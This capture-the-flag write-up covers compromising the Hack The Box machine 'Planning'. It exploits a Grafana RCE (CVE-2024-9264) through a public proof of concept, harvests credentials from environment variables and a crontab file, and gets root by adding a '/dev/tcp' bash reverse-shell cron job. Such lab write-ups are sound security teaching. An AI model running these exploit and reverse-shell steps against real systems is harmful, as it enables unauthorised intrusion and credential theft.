
![Planning image](../Pasted%20image%2020250720121032.png)
<!--![[Pasted image 20250720121032.png]]-->

#### Machine Information

As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r

#### Target IP Address upon playing
10.10.11.68

#### Nmap Scan:
nmap -sC -sV  10.10.11.68 -oN planning_nmap.txt 

```nmap_scan
Nmap 7.95 scan initiated Sat Jul 19 22:54:41 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN planning_nmap.txt 10.10.11.68
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done at Sat Jul 19 22:54:56 2025 -- 1 IP address (1 host up) scanned in 15.00 seconds
```


#### Accessing the Site
Since the nmap scan shows that port 80 is open, I typed the IP address in the browser but it says unreachable and it redirected to "http://planning.htb/"

The site is not a recognizable host so I added it in the **/etc/hosts** directory of my kali machine.
```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Planning]
└─$ sudo nano /etc/hosts
```

```
10.10.11.68   planning.htb
```


After reloading I was able to access the site.
![Planning image](../Pasted%20image%2020250720124109.png)
<!--![[Pasted image 20250720124109.png]]-->
I looked for low hanging fruits in the site itself but I didn't see anything interesting.

#### Fuzzing the subdomain

I tried using gobuster, nikto, dirb, and ffuf first to scan for hidden directories but to no avail. So I looked for the hidden subdomains using the subdomains-top1million-5000.txt from Sec-List but I didn't find anything. So I used the namelist.txt.

```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Planning]
└─$ ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/wordlists/SecLists-master/Discovery/DNS/namelist.txt -fs 178 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 147ms]
:: Progress: [151265/151265] :: Job [1/1] :: 634 req/sec :: Duration: [0:04:59] :: Errors: 0 ::
```

I got grafana from the ffuf result. I added it also in the known hosts under **/etc/hosts**, the same way I put the planning.htb so I could access it.

#### Accessing the 'grafana' subdomain
Upon accessing the 'http://grafana.planning.htb', I was prompted to the Grafana login page as shown below:
![Planning image](../Pasted%20image%2020250720150949.png)
<!--![[Pasted image 20250720150949.png]]-->

Since the Username and Password was given in the Machine information, I logged in and tried to if there are any more clues. I noticed the Grafana version in the bottom part of the login page. You can also see it on the question mark "?" icon on the upper right part of the Grafana Homepage.

![Planning image](../Pasted%20image%2020250720152116.png)
<!--![[Pasted image 20250720152116.png]]-->

Upon searching the internet, it seems that it was a vulnerable version of Grafana which allows attackers to gain RCE in the system. This vulnerability is based on the CVE-2024-9264. I saw github exploits/PoC in this link: [(CVE-2024–9264)](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/blob/main/poc.py).

#### Initial Foothold
To gain the initial foothold to the machine, I cloned the github repository in my kali machine.
``` kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Planning]
└─$ git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit.git             
Cloning into 'CVE-2024-9264-RCE-Exploit'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 15 (delta 6), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (15/15), 5.73 KiB | 5.73 MiB/s, done.
Resolving deltas: 100% (6/6), done.
```

After cloning I proceed to the created directory:
``` kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Planning]
└─$ cd CVE-2024-9264-RCE-Exploit
```

Before running the exploit, I setup a netcat listener:
```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Planning]
└─$ nc -lnvp 9443
```
Then I ran the python script to execute the exploit:
```kali-terminal
python poc.py --url http://grafana.planning.htb:80 --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.59 --reverse-port 9443
```

On the listener, I gained access to the listener and proceeded to enumerate it.
```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Planning]
└─$ nc -lnvp 9443                        
listening on [any] 9443 ...
connect to [10.10.14.59] from (UNKNOWN) [10.10.11.68] 55718
sh: 0: can't access tty; job control turned off
# bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~# ls
ls
LICENSE
bin
conf
public
root@7ce659d667d7:~# whoami
whoami
root
```


#### User Flag
It seems like I am in a docker environment. After looking for any important information, the only thing I found was when reading the environment variables. I typed 'env' in our shell to see these juicy information:

```nc-listener-access
root@7ce659d667d7:~# env   
env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
OLDPWD=/usr/share/grafana/bin
```

It seems like we got a username and password!

Now we'll connect to the machine via ssh:
```ssh-access
ssh enzo@planning.htb
```

Just enter the password and we can now read the user.txt file.
```ssh-access
enzo@planning:~$ ls
user.txt
enzo@planning:~$ cat user.txt
0b4aba13330ecaebde640b38336f3e83
```


#### Privilege Escalation
I tried running 'sudo -l' hoping to find some low hanging fruit but it doesn't work. So I transferred linpeas in the target machine.

First start a python http server in your kali machine in the directory where the linpeas is saved:
```kali-terminal
┌──(kali㉿kali)-[~/Downloads]
└─$ cd /usr/share/peass/linpeas/
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ ls
linpeas_darwin_amd64  linpeas_darwin_arm64  linpeas_fat.sh  linpeas_linux_386  linpeas_linux_amd64  linpeas_linux_arm  linpeas_linux_arm64  linpeas.sh  linpeas_small.sh
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
```

Then download/transfer it in the target machine:
```ssh-access
enzo@planning:~$ wget http://10.10.14.59:8090/linpeas
--2025-07-19 17:12:12--  http://10.10.14.59:8090/linpeas
Connecting to 10.10.14.59:8090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 82 [application/octet-stream]
Saving to: ‘linpeas’

linpeas                                                    100%[========================================================================================================================================>]      82  --.-KB/s    in 0.002s  

2025-07-19 17:12:13 (51.2 KB/s) - ‘linpeas’ saved [82/82]
```

After downloading, change its permission and run it as shown below:
```ssh-access
enzo@planning:~$ ls
linpeas.sh  user.txt
enzo@planning:~$ chmod +x linpeas.sh
enzo@planning:~$ ls
linpeas.sh  user.txt
enzo@planning:~$ ./linpeas.sh
```

Running linpeas, I got the following information:
![Planning image](../Pasted%20image%2020250720163141.png)
<!--![[Pasted image 20250720163141.png]]-->

Reading it and we got the following:
```ssh-access
enzo@planning:~$ cat /opt/crontabs/crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

I checked linpeas again to look for open ports which might be hosting a local web server and I found this:
![Planning image](../Pasted%20image%2020250720163714.png)
<!--![[Pasted image 20250720163714.png]]-->

It looks like there’s a web server running on port 8000. I've set up port forwarding to my kali machine to access the service on port 8000.

```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Planning]
└─$ ssh -L 8000:localhost:8000 enzo@planning.htb
enzo@planning.htb's password:
```
I just entered enzo's password and I'm in.

To access the server, I just accessed the localhost on port 8000 on my kali's browser. After that I'm prompted to enter the username and password that we got from the crontab.db. Which are:

"root:P4ssw0rdS0pRi0T3c"

Then we can see this page:
![Planning image](../Pasted%20image%2020250720164325.png)
<!--![[Pasted image 20250720164325.png]]-->

As you can see, there was a created cronjobs with a random name and it contains our shell which is the "bash -c 'exec bash -i &>/dev/tcp/10.10.14.99/8888 <&1'"

I clicked the new button then entered that command in the command field. I saved it then ran a netcat listener on port 8888. Then go back to the cronjobs page and execute the reverse shell.

On my netcat listener, I got the connection and navigate to read the root.txt file.

```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Planning]
└─$ nc -lnvp 8888                                 
listening on [any] 8888 ...
connect to [10.10.14.59] from (UNKNOWN) [10.10.11.68] 53322
bash: cannot set terminal process group (1455): Inappropriate ioctl for device
bash: no job control in this shell
root@planning:/# ls
ls
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib64
lib.usr-is-merged
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var
root@planning:/# cd root
cd root
root@planning:~# ls
ls
root.txt
scripts
root@planning:~# cat root.txt
cat root.txt
7c7f67163c54ebcc7571e212ad30677e
```



And there you have it!

Happy hacking!
